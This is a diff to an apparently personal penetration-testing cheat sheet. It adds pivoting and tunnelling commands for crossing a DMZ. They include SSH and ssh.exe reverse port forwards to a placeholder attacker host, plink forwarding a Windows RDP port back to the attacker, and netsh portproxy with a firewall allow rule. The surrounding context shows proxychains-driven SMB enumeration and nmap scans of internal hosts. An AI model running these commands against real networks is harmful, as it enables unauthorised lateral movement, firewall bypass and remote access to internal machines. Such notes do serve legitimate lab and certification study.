@@ -25,6 +25,8 @@ Awk tips: https://www.theunixschool.com/2012/06/awk-10-examples-to-group-data-in
 
 ### Ssh
 
+IpAttacker <--|--> IpDmzOut <--DMZ--> IpDmzIn <--|--> IpDeepIn
+
 ```
 python3 -c 'import pty; pty.spawn("/bin/sh")'
 nc -zv -w 1 $IP $Port # listen, verbose, timeout 1sec
@@ -38,12 +40,42 @@ Kali$ vi /etc/proxychains4.conf
 Kali$ proxychains smbclient -L //$IpDeepInternal/ -U someuser --password=somepass
 Kali$ proxychains nmap -vvv -sT --top-ports=20 -Pn $IpDeepInternal
 
+ssh -N -R localhost:2345:$IpDmzIn:$PortDmzIn user@IpAttacker
+
 ```
 
 ### Windows
 
-```
+#### Ssh.exe
 
 ```
+Windows PS> ssh.exe -N -R $ListeningPort user@$IpAttacker
+Kali$ ss -lntpu # check
+Kali$ vim /etc/proxychains4.conf
+    socks5 127.0.0.1 $ListeningPort
+Kali$ proxychains mycommand myoptions
+```
+
+#### Plink
+
+```
+KaliRshell$ cmdprompt> C:\path\to\plink.exe -ssh -l kaliuser -pw somepass -R 127.0.0.1:9833:127.0.0.1:3389 $IpAttacker
+KaliRshell$ cmdprompt> KaliNormalShell$ ss -ntplu # check
+Kali$ xfreerdp /u:rdp_user /p:rdp_pass /v:127.0.0.1:9833
+```
+
+#### Netsh
+
+```
+> netsh interface portproxy add v4tov4 listenport=2222 listenaddress=$IpDmzOut connectport=22 connectaddress=$IpDmzIn
+> netstat -anp TCP | find "2222"
+> netsh interface portproxy show all
+> netsh advfirewall firewall add rule name="my_rule_name" protocol=TCP dir=in localip=$IpDmzOut localport=2222 action=allow
+$ ssh user@$IpDmzOut -p2222
+> netsh advfirewall firewall delete rule name="my_rule_name"
+> netsh interface portproxy del v4tov4 listenport=2222 listenaddress=$IpDmzOut
+> netsh interface portproxy show all
+```
+
 
 
